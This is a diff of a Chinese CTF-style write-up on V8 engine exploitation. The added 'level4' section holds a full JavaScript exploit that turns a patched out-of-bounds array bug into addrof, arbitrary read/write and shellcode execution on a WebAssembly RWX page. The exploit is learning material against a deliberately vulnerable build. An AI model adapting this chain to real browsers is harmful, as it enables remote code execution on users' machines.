@@ -33,7 +33,7 @@ patch文件提供了三个函数，`GetAddressOf`,`ArbRead32`和`ArbWrite32`。`
 
 ……然后噩梦就开始了。我根据教程里的说法用`%DebugPrint`+while无限循环调试，捣鼓了好一会终于成功了。但是`%DebugPrint`只有开启`--allow-natives-syntax`才能用，而实战环境里是没有的，所以我得去掉这句。但是v8 pwn和平时搞的linux pwn不同，非常不稳定。只要我改动一点，比如删除某行或者添加某行代码，泄漏地址的偏移就不一样了。现在问题来了，我得用`%DebugPrint`才能知道wasm_instance的地址从而计算泄漏的偏移，但是实战环境不能用；我又没办法算没有`%DebugPrint`时的偏移。这不就卡死了？
 
-后面想了个别的方法。用`%DebugPrint`可以得到wasm_instance的地址，而wasm_instance内含有一些特殊的字节。这些字节在脚本每次运行时都一样，无论有没有`%DebugPrint`。所以在pwndbg里对这些字节用`search -x`就能在无`%DebugPrint`的情况下找到wasm_instance的地址了
+后面想了个别的方法。用`%DebugPrint`可以得到wasm_instance的地址，而wasm_instance内含有一些特殊的字节。这些字节在脚本每次运行时都一样，无论有没有`%DebugPrint`。所以在pwndbg里对这些字节用`search -x`(其实直接`search -p`就行，还不用手动转端序)就能在无`%DebugPrint`的情况下找到wasm_instance的地址了
 
 还有一点是js里的整数。`ArbRead32`一次只能读32 bit，所以想要泄漏wasm的RWX内存地址要读两次。假设上半部分叫upper，下半部分叫lower，那么完整地址是`(upper<<32)|lower`对吧（至少python里是的）？结果js里因为整数带符号，出来的结果乱七八糟。后面我尝试套了一层BigInt，把`|`换成`+`，行了。不确定这是不是最好的办法，总之能用
 ```js
@@ -147,3 +147,76 @@ while(1){}
 最后是不得不品的调试环节。它竟然能这么不稳定。上一题发现增减语句会导致偏移不对，没想到怎么唤起的d8也能影响偏移。我的exp首先在pwndbg里打印出了flag，但运行run时不行。最后在脚本末尾加了句`while(1){}`，然后用pwndbg attach找的偏移
 
 还好这题会变的偏移其实只有两个，float_arr_map的偏移和rwx_page_addr的偏移。我一直习惯一步完成后再写下一步，但放到v8里会非常痛苦。第一步成功后去写第二步，写完后第一步废了；改完后去写第三步，写完后第一步第二步全废了……不断循环。这题exp的逻辑很清晰，所以更好的做法应该是先一次写完exp，标记会变的偏移后再用一次调试确定全部的偏移。但这个做法后续题目复杂了就不好用了吧，至少我是绝对没有一次完成exp全部步骤的能力的
+
+## level4
+
+patch文件提供了`setLength`函数，允许将数组的长度改为任意值。和上一题很像，几乎完全等于 https://faraz.faith/2019-12-13-starctf-oob-v8-indepth 和教程Part 6的情景。不过我不太喜欢Part 6提供的exp的`arrays[2]`数组定义方式，遂跟着上周就看过的wp做。那篇wp只能oob一个索引，而这题拥有无限的oob，所以可以简化一点它的做法
+```js
+var buf = new ArrayBuffer(8);
+var f64_buf = new Float64Array(buf);
+var u64_buf = new Uint32Array(buf);
+function ftoi(val) {
+    f64_buf[0] = val;
+    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
+}
+function itof(val) {
+    u64_buf[0] = Number(val & 0xffffffffn);
+    u64_buf[1] = Number(val >> 32n);
+    return f64_buf[0];
+}
+function shift32(i) {
+	return i << 32n;
+}
+function lowerhalf(i) {
+	return i % 0x100000000n;
+}
+RWX_PAGE_OFFSET=0x2c233n;
+var float_arr = [1.1];
+var obj = {"A":1};
+var obj_arr = [obj];
+float_arr.setLength(11);
+var float_arr_map = ftoi(float_arr[1]);
+var obj_arr_map = ftoi(float_arr[10]);
+console.log(float_arr_map);
+console.log(obj_arr_map);
+var something=[1.2];
+something.setLength(3);
+function addrof(in_obj) {
+    obj_arr[0] = in_obj;
+    float_arr[10]=itof(float_arr_map);
+    let addr = obj_arr[0];
+    float_arr[10]=itof(obj_arr_map);
+    return lowerhalf(ftoi(addr));
+}
+function arb_read(addr) {
+    float_arr[2]=itof(shift32(2n)+BigInt(addr-8n));
+    return ftoi(float_arr[0]);
+}
+function arb_write(addr, val) {
+    something[2]=itof(shift32(2n)+BigInt(addr-8n));
+    something[0] = itof(val);
+}
+var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
+var wasm_mod = new WebAssembly.Module(wasm_code);
+var wasm_instance = new WebAssembly.Instance(wasm_mod);
+var f = wasm_instance.exports.main;
+var shellcode=[23486568, 607420673, 16843009, 1701296200, 1952539439, 1213230182, 1751330744, 1701604449, 2303217774, 835858919, 1480289014, 1295];
+let shellcode_buf = new ArrayBuffer(shellcode.length * 4);
+let buf_addr = addrof(shellcode_buf);
+var rwx_page_addr = arb_read(addrof(wasm_instance)+RWX_PAGE_OFFSET+1n);
+console.log(rwx_page_addr);
+console.log(buf_addr);
+let backing_store_addr = buf_addr + 0x24n;
+arb_write(backing_store_addr,rwx_page_addr);
+let dataview = new DataView(shellcode_buf);
+for (let i = 0; i < shellcode.length; i++) {
+	dataview.setUint32(4 * i, shellcode[i], true);
+}
+f();
+while(1){}
+```
+脚本中的`arb_read`和`arb_write`均只能调用一次。本来出现oob的数组（float_arr）是用来覆盖相邻的下一个数组的elements指针的，我直接改了float_arr自己的elements……导致我在写arb_write卡了很久，完全没意识到我用的还是float_arr。float_arr在调用arb_read时已经“坏”了，通过写elements已无法修改数组结构（elements现在是arb_read的参数，自然无法二次修改数组结构）。我懒得重新布局，于是将错就错，额外给arb_write加了个something数组。此举没有扰乱之前float_arr和obj_arr的布局，加上arb_read和arb_write都只需要用一次，侥幸过关
+
+过程中遇见了一个很无语的事。在我构造好addrof primitive后，能正常泄漏出wasm_instance的地址，但泄漏不出shellcode_buf的地址。调试了很久都不知道哪里有问题。去服务器搜了一下，发现其他人也有类似的问题，有时能行有时不能行，竟然属于正常现象。后面我修改了两者的泄漏顺序（最开始是先`addrof(wasm_instance)`再`addrof(shellcode_buf)`），奇迹般地跑起来了
+
+另外，环境好像变了。现在直接运行`sudo pwndbg`会提示没有PATH变量。用`sudo env PATH="$PATH" pwndbg`即可
